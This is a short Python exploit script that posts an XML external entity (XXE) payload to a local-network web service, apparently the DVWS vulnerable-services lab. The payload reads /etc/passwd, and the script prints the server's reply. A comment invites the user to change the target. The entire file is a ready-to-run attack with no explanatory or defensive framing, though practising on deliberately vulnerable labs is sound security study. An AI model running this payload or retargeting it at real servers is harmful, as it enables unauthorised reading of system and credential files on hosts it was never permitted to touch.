import requests

TARGET_URL = 'http://192.168.0.19:8080/dvwsuserservice/'  # Change this
HEADERS = {
    'Content-Type': 'application/xml',
    'User-Agent': 'Mozilla/5.0'
}

# Malicious XXE Payload to read /etc/passwd
payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <username>&xxe;</username>
  <password>test</password>
</user>
'''

def exploit_xxe():
    print(f"[+] Sending XXE payload to {TARGET_URL}")
    response = requests.post(TARGET_URL, headers=HEADERS, data=payload)
    print(f"[+] Status Code: {response.status_code}")
    print("[+] Response Content:\n")
    print(response.text)

if __name__ == '__main__':
    exploit_xxe()
